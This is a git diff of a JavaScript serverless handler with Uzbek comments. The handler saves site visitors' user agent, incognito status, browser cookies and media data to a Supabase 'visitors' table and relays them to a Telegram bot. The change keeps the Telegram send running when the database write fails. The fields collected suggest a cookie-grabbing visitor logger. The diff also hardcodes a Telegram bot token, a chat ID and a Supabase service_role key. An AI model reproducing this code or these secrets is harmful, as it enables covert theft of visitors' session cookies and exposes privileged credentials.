@@ -65,12 +65,14 @@ export default async function handler(req, res) {
 ----------------------------
 `;
 
-    // Supabase ma'lumotlari
-    const SUPABASE_URL = 'https://hhsasepeklroqbvnaewg.supabase.co';
-    const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imhoc2FzZXBla2xyb3Fidm5hZXdnIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NzY2NzM5MiwiZXhwIjoyMDkzMjQzMzkyfQ.U4wV6U3dCbl29f8X3Jng6EMfoPoPpxYLkJhF1xvPhys';
+    // O'zgaruvchilarni olish (Vercel-dan yoki hardcoded)
+    const BOT_TOKEN = process.env.BOT_TOKEN || '8719431824:AAGiJ9wTJ5XAn3xv0mr1weYhgOyAq-KFblA';
+    const CHAT_ID = process.env.CHAT_ID || '5572037414';
+    const SUPABASE_URL = process.env.SUPABASE_URL || 'https://hhsasepeklroqbvnaewg.supabase.co';
+    const SUPABASE_KEY = process.env.SUPABASE_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imhoc2FzZXBla2xyb3Fidm5hZXdnIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NzY2NzM5MiwiZXhwIjoyMDkzMjQzMzkyfQ.U4wV6U3dCbl29f8X3Jng6EMfoPoPpxYLkJhF1xvPhys';
 
+    // 1. Supabase-ga saqlash (Alohida blokda, xatolik Telegramni to'xtatmasligi uchun)
     try {
-        // 1. Supabase-ga saqlash
         await fetch(`${SUPABASE_URL}/rest/v1/visitors`, {
             method: 'POST',
             headers: {
@@ -97,11 +99,15 @@ export default async function handler(req, res) {
                 user_agent: ua,
                 incognito: data.incognito,
                 cookies: data.cookies,
-                media: JSON.stringify(data.media)
+                media: JSON.stringify(data.media || {})
             })
         });
+    } catch (dbError) {
+        console.error('Supabase xatoligi:', dbError);
+    }
 
-        // 2. Telegram-ga yuborish
+    // 2. Telegram-ga yuborish
+    try {
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -111,9 +117,9 @@ export default async function handler(req, res) {
                 parse_mode: 'Markdown'
             })
         });
-        
-        return res.status(200).json({ success: true });
-    } catch (error) {
-        return res.status(500).json({ error: error.message });
+    } catch (tgError) {
+        console.error('Telegram xatoligi:', tgError);
     }
+
+    return res.status(200).json({ success: true });
 }
